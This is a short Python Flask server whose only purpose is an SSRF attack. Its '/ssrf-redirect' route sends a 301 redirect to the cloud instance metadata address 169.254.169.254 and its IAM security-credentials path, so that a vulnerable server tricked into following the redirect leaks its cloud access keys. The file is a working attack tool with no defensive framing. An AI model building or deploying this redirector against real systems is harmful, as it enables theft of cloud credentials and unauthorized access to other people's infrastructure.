# app.py
from flask import Flask, redirect

app = Flask(__name__)

@app.route("/ssrf-redirect")
def ssrf_redirect():
    print("[+] Redirect triggered!")
    return redirect(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        code=301
    )

@app.route("/")
def index():
    return "ok", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
